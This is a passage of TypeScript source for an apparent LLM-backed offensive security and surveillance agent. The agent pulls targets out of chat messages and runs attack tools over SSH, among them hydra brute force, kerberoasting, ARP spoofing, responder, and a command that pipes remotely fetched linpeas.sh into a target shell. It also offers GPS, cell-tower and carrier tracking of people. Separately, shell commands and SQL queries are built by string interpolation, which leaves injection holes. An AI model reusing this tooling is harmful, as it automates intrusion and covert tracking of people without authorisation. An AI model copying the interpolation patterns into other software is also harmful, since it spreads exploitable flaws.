  ).bind(session_id || '', finding_type || 'general', severity || 'info', title || 'Untitled', description || '', target || '', JSON.stringify(evidence || {}), remediation || '', cvss_score || 0, JSON.stringify(cve_ids || []), JSON.stringify(mitre_ids || [])).run();

  return c.json({ finding_id: result.meta.last_row_id, status: 'created' });
});

app.get('/findings', async (c) => {
  const severity = c.req.query('severity');
  const status = c.req.query('status');
  let sql = 'SELECT * FROM security_findings ORDER BY created_at DESC LIMIT 100';
  const conditions: string[] = [];
  if (severity) conditions.push(`severity = '${severity}'`);
  if (status) conditions.push(`status = '${status}'`);
  if (conditions.length) sql = `SELECT * FROM security_findings WHERE ${conditions.join(' AND ')} ORDER BY created_at DESC LIMIT 100`;

  const findings = await c.env.DB.prepare(sql).all();
  return c.json({
    total: findings.results.length,
    findings: findings.results.map((f: any) => ({
      ...f,
      evidence: JSON.parse(f.evidence || '{}'),
      cve_ids: JSON.parse(f.cve_ids || '[]'),
      mitre_ids: JSON.parse(f.mitre_ids || '[]')
    }))
  });
});

// ═══════════════════════════════════════════════════════════════
// THREAT INTEL
// ═══════════════════════════════════════════════════════════════

app.post('/threat/add', async (c) => {
  const { indicator_type, indicator_value, threat_score, source, tags, context } = await c.req.json();
  if (!indicator_type || !indicator_value) return c.json({ error: 'indicator_type and indicator_value required' }, 400);

  await c.env.DB.prepare(
    `INSERT INTO threat_intel (indicator_type, indicator_value, threat_score, source, tags, context)
     VALUES (?, ?, ?, ?, ?, ?)
     ON CONFLICT(indicator_type, indicator_value) DO UPDATE SET
     threat_score = excluded.threat_score, last_seen = datetime('now'), tags = excluded.tags`
  ).bind(indicator_type, indicator_value, threat_score || 0, source || 'manual', JSON.stringify(tags || []), JSON.stringify(context || {})).run();

  return c.json({ status: 'stored', indicator_type, indicator_value });
});

app.get('/threat/search', async (c) => {
  const query = c.req.query('q');
  const type = c.req.query('type');
  if (!query) return c.json({ error: 'q parameter required' }, 400);

  let sql = 'SELECT * FROM threat_intel WHERE indicator_value LIKE ? ORDER BY threat_score DESC LIMIT 50';
  if (type) sql = `SELECT * FROM threat_intel WHERE indicator_type = '${type}' AND indicator_value LIKE ? ORDER BY threat_score DESC LIMIT 50`;

  const results = await c.env.DB.prepare(sql).bind(`%${query}%`).all();
  return c.json({ results: results.results.map((r: any) => ({ ...r, tags: JSON.parse(r.tags || '[]'), context: JSON.parse(r.context || '{}') })) });
});

// ═══════════════════════════════════════════════════════════════
// CONVERSATION MANAGEMENT
// ═══════════════════════════════════════════════════════════════

app.get('/conversations', async (c) => {
  const convos = await c.env.DB.prepare('SELECT session_id, operator, trust_level, risk_level, status, created_at, updated_at FROM conversations ORDER BY updated_at DESC LIMIT 50').all();
  return c.json({ conversations: convos.results });
});

app.get('/conversation/:session_id', async (c) => {
  const conv = await loadConversation(c.env.DB, c.req.param('session_id'));
  if (!conv) return c.json({ error: 'Not found' }, 404);
  return c.json(conv);
});

// ═══════════════════════════════════════════════════════════════
// STATS & ANALYTICS
// ═══════════════════════════════════════════════════════════════

app.get('/stats', async (c) => {
  const [convos, queries, tools, findings, chains, threats] = await Promise.all([
    c.env.DB.prepare('SELECT COUNT(*) as cnt FROM conversations').first(),
    c.env.DB.prepare('SELECT COUNT(*) as cnt FROM queries').first(),
    c.env.DB.prepare('SELECT COUNT(*) as cnt FROM tool_executions').first(),
    c.env.DB.prepare('SELECT COUNT(*) as cnt FROM security_findings').first(),
    c.env.DB.prepare('SELECT COUNT(*) as cnt FROM attack_chains').first(),
    c.env.DB.prepare('SELECT COUNT(*) as cnt FROM threat_intel').first(),
  ]);

  const topTools = await c.env.DB.prepare('SELECT tool_name, COUNT(*) as cnt FROM tool_executions GROUP BY tool_name ORDER BY cnt DESC LIMIT 10').all();
  const recentFindings = await c.env.DB.prepare("SELECT severity, COUNT(*) as cnt FROM security_findings WHERE created_at > datetime('now', '-7 days') GROUP BY severity").all();

  return c.json({
    conversations: convos?.cnt || 0,
    total_queries: queries?.cnt || 0,
    tools_executed: tools?.cnt || 0,
    security_findings: findings?.cnt || 0,
    attack_chains: chains?.cnt || 0,
    threat_indicators: threats?.cnt || 0,
    top_tools: topTools.results,
    recent_findings_by_severity: recentFindings.results
  });
});

// ═══════════════════════════════════════════════════════════════
// HELPER FUNCTIONS
// ═══════════════════════════════════════════════════════════════

async function loadConversation(db: D1Database, sessionId: string): Promise<ConversationContext | null> {
  const row = await db.prepare('SELECT * FROM conversations WHERE session_id = ?').bind(sessionId).first();
  if (!row) return null;
  return {
    session_id: row.session_id as string,
    messages: JSON.parse(row.messages as string || '[]'),
    tools_used: JSON.parse(row.tools_used as string || '[]'),
    targets: JSON.parse(row.targets as string || '[]'),
    mitre_techniques: JSON.parse(row.mitre_techniques as string || '[]'),
    risk_level: row.risk_level as string,
    created_at: row.created_at as string
  };
}

async function saveConversation(db: D1Database, conv: ConversationContext): Promise<void> {
  await db.prepare(
    `INSERT INTO conversations (session_id, messages, tools_used, targets, mitre_techniques, risk_level, updated_at)
     VALUES (?, ?, ?, ?, ?, ?, datetime('now'))
     ON CONFLICT(session_id) DO UPDATE SET
     messages = excluded.messages, tools_used = excluded.tools_used, targets = excluded.targets,
     mitre_techniques = excluded.mitre_techniques, risk_level = excluded.risk_level, updated_at = datetime('now')`
  ).bind(conv.session_id, JSON.stringify(conv.messages.slice(-50)), JSON.stringify(conv.tools_used), JSON.stringify(conv.targets), JSON.stringify(conv.mitre_techniques), conv.risk_level).run();
}

function classifySecurityQuery(message: string): { categories: string[]; tools: SecurityTool[]; mitre_ids: string[] } {
  const lower = message.toLowerCase();
  const categories: string[] = [];
  const tools: SecurityTool[] = [];
  const mitreIds: string[] = [];

  // Category detection patterns
  const patterns: Record<string, RegExp[]> = {
    osint: [/osint/i, /email.*lookup/i, /username.*search/i, /phone.*lookup/i, /domain.*recon/i, /person.*search/i, /sherlock/i, /holehe/i, /maigret/i, /phoneinf/i, /theharvester/i, /amass/i, /spiderfoot/i],
    network: [/port\s*scan/i, /nmap/i, /masscan/i, /service\s*(detect|enum)/i, /network\s*scan/i, /vuln\s*scan/i],
    web: [/sql\s*inject/i, /sqli/i, /xss/i, /web\s*(scan|vuln|security)/i, /sqlmap/i, /nuclei/i, /nikto/i, /wordpress/i, /wpscan/i, /directory\s*(fuzz|brute|bust)/i, /feroxbuster/i, /ffuf/i, /burp/i],
    exploit: [/exploit/i, /metasploit/i, /msfconsole/i, /searchsploit/i, /payload/i, /shellcode/i],
    crack: [/crack/i, /hash/i, /brute\s*force/i, /hashcat/i, /john/i, /hydra/i, /password/i],
    ad: [/active\s*directory/i, /kerberos/i, /bloodhound/i, /dcsync/i, /golden\s*ticket/i, /silver\s*ticket/i, /ntlm/i, /ldap/i, /domain\s*(admin|controller)/i, /impacket/i, /rubeus/i],
    wireless: [/wifi/i, /wireless/i, /aircrack/i, /wpa/i, /deauth/i, /kismet/i, /reaver/i, /wifite/i, /bluetooth/i, /ble/i],
    forensics: [/forensic/i, /volatility/i, /memory\s*(dump|analysis)/i, /disk\s*image/i, /autopsy/i, /sleuth/i, /incident\s*response/i, /evidence/i],
    surveillance: [/gps/i, /track/i, /locate/i, /cell\s*tower/i, /triangulat/i, /carrier/i, /sim\s*swap/i, /imsi/i, /stingray/i, /surveil/i, /argus/i, /panoptes/i, /camera/i, /alpr/i, /license\s*plate/i, /facial\s*recog/i, /geofenc/i],
    reversing: [/reverse\s*eng/i, /ghidra/i, /ida\s*pro/i, /radare/i, /binary\s*analy/i, /decompil/i, /disassembl/i, /firmware/i, /malware\s*analy/i],
    privesc: [/priv.*esc/i, /linpeas/i, /winpeas/i, /powerup/i, /suid/i, /sudo/i, /kernel\s*exploit/i],
    cloud: [/aws/i, /azure/i, /gcp/i, /cloud\s*(security|audit|config)/i, /s3\s*bucket/i, /scoutsuite/i, /prowler/i, /pacu/i],
    mitm: [/mitm/i, /man\s*in\s*the\s*middle/i, /arp\s*spoof/i, /dns\s*poison/i, /responder/i, /llmnr/i, /ssl\s*strip/i, /bettercap/i],
    mobile: [/android/i, /ios/i, /mobile\s*sec/i, /frida/i, /objection/i, /apk/i, /jailbreak/i, /root/i],
    redteam: [/red\s*team/i, /c2/i, /cobalt\s*strike/i, /sliver/i, /havoc/i, /beacon/i, /persistence/i, /lateral\s*move/i, /evasion/i],
  };

  for (const [cat, regexes] of Object.entries(patterns)) {
    if (regexes.some(r => r.test(lower))) {
      categories.push(cat);
    }
  }

  // Match specific tools
  for (const tool of SECURITY_TOOLS) {
    const toolPatterns = [
      new RegExp(tool.name.replace(/_/g, '[\\s_]'), 'i'),
      ...Object.keys(tool.parameters).filter(p => tool.parameters[p].required).map(p => new RegExp(p, 'i'))
    ];

    if (categories.includes(tool.category) || toolPatterns.some(p => p.test(lower))) {
      if (!tools.find(t => t.name === tool.name)) {
        tools.push(tool);
        if (tool.mitre_id) mitreIds.push(tool.mitre_id);
      }
    }
  }

  // Default to general security if no specific match
  if (categories.length === 0) categories.push('general');

  return { categories, tools, mitre_ids: [...new Set(mitreIds)] };
}

function extractToolParams(message: string, tool: SecurityTool): Record<string, string> {
  const params: Record<string, string> = {};

  // IP address extraction
  const ipMatch = message.match(/\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?:\/\d{1,2})?)\b/);
  if (ipMatch) {
    if (tool.parameters.target) params.target = ipMatch[1];
    if (tool.parameters.ip) params.ip = ipMatch[1];
  }

  // Domain extraction
  const domainMatch = message.match(/\b([a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.(?:[a-zA-Z]{2,}))\b/);
  if (domainMatch && !ipMatch) {
    if (tool.parameters.domain) params.domain = domainMatch[1];
    if (tool.parameters.target) params.target = domainMatch[1];
    if (tool.parameters.url) params.url = `https://${domainMatch[1]}`;
  }

  // URL extraction
  const urlMatch = message.match(/https?:\/\/[^\s"'<>]+/);
  if (urlMatch) {
    if (tool.parameters.url) params.url = urlMatch[0];
    if (tool.parameters.target) params.target = urlMatch[0];
  }

  // Email extraction
  const emailMatch = message.match(/\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b/);
  if (emailMatch) {
    if (tool.parameters.email) params.email = emailMatch[0];
  }

  // Phone extraction
  const phoneMatch = message.match(/\+?\d{1,3}[\s-]?\(?\d{3}\)?[\s-]?\d{3}[\s-]?\d{4}/);
  if (phoneMatch) {
    if (tool.parameters.phone) params.phone = phoneMatch[0];
  }

  // Username extraction after "username" keyword
  const userMatch = message.match(/username\s+(\S+)/i);
  if (userMatch) {
    if (tool.parameters.username) params.username = userMatch[1];
  }

  // Hash extraction (hex strings 32+ chars)
  const hashMatch = message.match(/\b([a-fA-F0-9]{32,128})\b/);
  if (hashMatch) {
    if (tool.parameters.hash) params.hash = hashMatch[1];
  }

  return params;
}

async function getAIResponse(env: Bindings, messages: ChatMessage[]): Promise<{ content: string; model: string }> {
  // Tier 1: Custom Prometheus LoRA model (RunPod/BRAVO)
  const modelUrl = env.PROMETHEUS_MODEL_URL || env.BRAVO_INFERENCE_URL;
  if (modelUrl) {
    try {
      const resp = await fetch(`${modelUrl}/v1/chat/completions`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          model: 'prometheus',
          messages: messages.map(m => ({ role: m.role, content: m.content })),
          max_tokens: 4000,
          temperature: 0.7,
          stop: ['<|im_end|>']
        }),
        signal: AbortSignal.timeout(30000)
      });
      if (resp.ok) {
        const data: any = await resp.json();
        if (data.choices?.[0]?.message?.content) {
          return { content: data.choices[0].message.content, model: 'prometheus-lora' };
        }
      }
    } catch (e) { log("warn", "Prometheus LoRA model inference failed", { error: (e as Error)?.message || String(e) }); }
  }

  // Tier 2: AI Orchestrator (30 free LLM workers)
  const orchUrl = env.AI_ORCHESTRATOR_URL || 'https://echo-ai-orchestrator.bmcii1976.workers.dev';
  try {
    const resp = await fetch(`${orchUrl}/chat`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-Echo-API-Key': env.ECHO_API_KEY || '' },
      body: JSON.stringify({
        messages: messages.map(m => ({ role: m.role, content: m.content })),
        max_tokens: 4000,
        temperature: 0.7,
        prefer_model: 'gpt-4.1'
      }),
      signal: AbortSignal.timeout(45000)
    });
    if (resp.ok) {
      const data: any = await resp.json();
      const content = data.choices?.[0]?.message?.content || data.response || data.content;
      if (content) return { content, model: data.model || 'ai-orchestrator' };
    }
  } catch (e) { log("warn", "AI Orchestrator inference failed", { error: (e as Error)?.message || String(e) }); }

  // Tier 3: OpenRouter (paid fallback)
  if (env.OPENROUTER_KEY) {
    try {
      const resp = await fetch('https://openrouter.ai/api/v1/chat/completions', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${env.OPENROUTER_KEY}`,
          'HTTP-Referer': 'https://echo-op.com',
          'X-Title': 'Prometheus Prime AI'
        },
        body: JSON.stringify({
          model: 'qwen/qwen-2.5-72b-instruct',
          messages: messages.map(m => ({ role: m.role, content: m.content })),
          max_tokens: 4000,
          temperature: 0.7
        }),
        signal: AbortSignal.timeout(60000)
      });
      if (resp.ok) {
        const data: any = await resp.json();
        if (data.choices?.[0]?.message?.content) {
          return { content: data.choices[0].message.content, model: 'openrouter/' + (data.model || 'qwen-72b') };
        }
      }
    } catch (e) { log("warn", "OpenRouter inference failed", { error: (e as Error)?.message || String(e) }); }
  }

  // Tier 4: Workers AI (always available)
  try {
    const resp = await env.AI.run('@cf/meta/llama-3.3-70b-instruct-fp8-fast', {
      messages: messages.map(m => ({ role: m.role, content: m.content.slice(0, 6000) })),
      max_tokens: 2000,
      temperature: 0.7
    });
    if (resp?.response) {
      return { content: resp.response, model: 'workers-ai/llama-3.3-70b' };
    }
  } catch (e) { log("warn", "Workers AI inference failed", { error: (e as Error)?.message || String(e) }); }

  throw new Error('All LLM providers failed');
}

async function querySecurityEngines(env: Bindings, query: string, classification: { categories: string[] }): Promise<string | null> {
  // Map categories to engine domain prefixes
  const domainMap: Record<string, string[]> = {
    osint: ['CYBER', 'OSINT'],
    network: ['CYBER', 'PENTEST', 'NET'],
    web: ['PENTEST', 'WEB', 'CYBER'],
    exploit: ['PENTEST', 'EXPLOIT', 'CYBER'],
    crack: ['CYBER', 'CRED'],
    ad: ['CYBER', 'AD', 'PENTEST'],
    wireless: ['CYBER', 'WIRELESS'],
    forensics: ['DFIR', 'FORENSIC', 'CYBER'],
    surveillance: ['CYBER', 'SURV', 'INTEL'],
    reversing: ['REVENG', 'MALWARE', 'CYBER'],
    privesc: ['PENTEST', 'CYBER'],
    cloud: ['CLOUD', 'CYBER'],
    mitm: ['CYBER', 'PENTEST', 'NET'],
    mobile: ['MOBILE', 'CYBER'],
    redteam: ['CYBER', 'REDTEAM', 'PENTEST'],
  };

  const domains = classification.categories.flatMap(c => domainMap[c] || ['CYBER']);
  const uniqueDomains = [...new Set(domains)].slice(0, 3);

  try {
    const resp = await env.ENGINES.fetch(new Request('https://engine/query', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        query,
        domains: uniqueDomains,
        mode: 'FAST',
        max_results: 5
      })
    }));
    if (resp.ok) {
      const data: any = await resp.json();
      if (data.response || data.answer) {
        return `[Engine Doctrine Response]\n\n${data.response || data.answer}\n\nSources: ${(data.sources || []).join(', ')}`;
      }
    }
  } catch (e) { log("warn", "Security engine query failed", { error: (e as Error)?.message || String(e) }); }

  return null;
}

async function executeSecurityTool(env: Bindings, sessionId: string, tool: SecurityTool, params: Record<string, string>): Promise<any> {
  // Route to appropriate backend
  switch (tool.category) {
    case 'surveillance':
      return executeSurveillanceTool(env, tool, params);
    default:
      return executePrometheusToolViaSsh(env, tool, params);
  }
}

async function executeSurveillanceTool(env: Bindings, tool: SecurityTool, params: Record<string, string>): Promise<any> {
  const endpointMap: Record<string, { method: string; path: string; body?: any }> = {
    surveillance_gps_track: { method: 'GET', path: `/gps/device/${params.device_id}/latest` },
    surveillance_cell_locate: { method: 'POST', path: '/cell/locate', body: { mcc: parseInt(params.mcc), mnc: parseInt(params.mnc), lac: parseInt(params.lac), cell_id: parseInt(params.cell_id) } },
    surveillance_ip_intel: { method: 'POST', path: '/ip/lookup', body: { ip: params.ip } },
    surveillance_carrier_lookup: { method: 'POST', path: '/carrier/lookup', body: { phone_number: params.phone } },
  };

  const endpoint = endpointMap[tool.name];
  if (!endpoint) return { error: `No endpoint mapping for ${tool.name}` };

  try {
    const req = endpoint.method === 'GET'
      ? new Request(`https://surveillance${endpoint.path}`)
      : new Request(`https://surveillance${endpoint.path}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(endpoint.body)
        });

    const resp = await env.SURVEILLANCE.fetch(req);
    return await resp.json();
  } catch (err: any) {
    return { error: err.message };
  }
}

async function executePrometheusToolViaSsh(env: Bindings, tool: SecurityTool, params: Record<string, string>): Promise<any> {
  // Build command for the tool category
  const commandMap: Record<string, (p: Record<string, string>) => string> = {
    osint_email_lookup: (p) => `holehe --only-used ${p.email}`,
    osint_username_search: (p) => `sherlock ${p.username} --timeout 15`,
    osint_phone_lookup: (p) => `phoneinfoga scan -n ${p.phone}`,
    osint_domain_recon: (p) => `amass enum -passive -d ${p.domain} -timeout 30`,
    osint_person_search: (p) => `echo "Person search: ${p.name}" && theHarvester -d "${p.name}" -b all -l 50`,
    network_port_scan: (p) => `nmap -sV -sC ${p.scan_type === 'aggressive' ? '-A' : '-T4'} ${p.ports ? `-p ${p.ports}` : '--top-ports 1000'} ${p.target}`,
    network_service_enum: (p) => `nmap -sV -sC -O ${p.target}`,
    network_vuln_scan: (p) => `nmap --script ${p.category || 'vuln'} ${p.target}`,
    web_sqli_test: (p) => `sqlmap -u "${p.url}" --batch --level=3 --risk=2 --random-agent`,
    web_directory_fuzz: (p) => `feroxbuster -u ${p.url} -w /usr/share/wordlists/dirb/common.txt -t 50 --quiet`,
    web_nuclei_scan: (p) => `nuclei -u ${p.target} -t ${p.templates || 'cves,misconfig'} -silent`,
    web_wpscan: (p) => `wpscan --url ${p.url} -e ${p.enumerate || 'vp,vt,u'} --random-user-agent`,
    exploit_search: (p) => `searchsploit ${p.query}`,
    crack_hash: (p) => `echo "${p.hash}" | john --format=${p.hash_type || 'auto'} --wordlist=/usr/share/wordlists/rockyou.txt /dev/stdin`,
    crack_brute_service: (p) => `hydra -L ${p.userlist || '/usr/share/wordlists/metasploit/common_users.txt'} -P ${p.passlist || '/usr/share/wordlists/metasploit/common_passwords.txt'} ${p.target} ${p.service}`,
    ad_bloodhound: (p) => `bloodhound-python -d ${p.domain} -c ${p.method || 'all'} --zip`,
    ad_kerberoast: (p) => `impacket-GetUserSPNs ${p.domain}/ -dc-ip ${p.dc_ip || p.domain} -request`,
    wireless_scan: (p) => `airodump-ng ${p.interface} --write-interval 5 -w /tmp/wifi_scan`,
    forensics_memory_dump: (p) => `vol.py -f ${p.target} ${p.plugin || 'pslist'}`,
    reversing_analyze: (p) => `rabin2 -I ${p.file} && r2 -qc "aaa; afl" ${p.file}`,
    privesc_linux: (p) => `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | ssh ${p.target} bash`,
    privesc_windows: (p) => `echo "WinPEAS requires Windows target at ${p.target}"`,
    cloud_aws_audit: (p) => `prowler ${p.services ? `-S ${p.services}` : ''} -M json`,
    mitm_arp_spoof: (p) => `bettercap -iface ${p.interface || 'eth0'} -eval "set arp.spoof.targets ${p.target}; arp.spoof on; net.sniff on"`,
    mitm_responder: (p) => `responder -I ${p.interface} -rdw`,
  };

  const cmdBuilder = commandMap[tool.name];
  if (!cmdBuilder) {
    // Fallback: use Prometheus Prime API endpoint
    const apiPath = `/${tool.category}/${tool.name.split('_').slice(1).join('/')}`;
    try {
      const resp = await env.ENGINES.fetch(new Request(`https://prometheus${apiPath}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(params)
      }));
      return await resp.json();
    } catch (e) { log("warn", "Prometheus Prime API fallback failed for tool", { tool: tool.name, error: (e as Error)?.message || String(e) });
      return { error: `No command mapping for ${tool.name}` };
    }
  }

  const command = cmdBuilder(params);

  // Execute via Commander API → SSH to CHARLIE
  const cmdApiUrl = env.COMMANDER_API_URL || 'https://commander.echo-op.com';
  try {
    const resp = await fetch(`${cmdApiUrl}/exec`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Echo-API-Key': env.ECHO_API_KEY || ''
      },
      body: JSON.stringify({
        command: `ssh echoprime@192.168.1.202 '${command.replace(/'/g, "'\\''")}'`,
        timeout: 60000
      }),
      signal: AbortSignal.timeout(65000)
    });

    if (resp.ok) {
      const data: any = await resp.json();
      return {
        command,
        output: data.stdout || data.output || '',
        error: data.stderr || '',
        exit_code: data.exit_code || 0,
        executed_on: 'CHARLIE (192.168.1.202)',
        tool: tool.name,
        mitre_id: tool.mitre_id
      };
    }
    return { error: `Commander API returned ${resp.status}`, command };
  } catch (err: any) {
    return { error: `SSH execution failed: ${err.message}`, command, note: 'CHARLIE node may be offline' };
  }
}

export default {
  fetch: app.fetch,
};
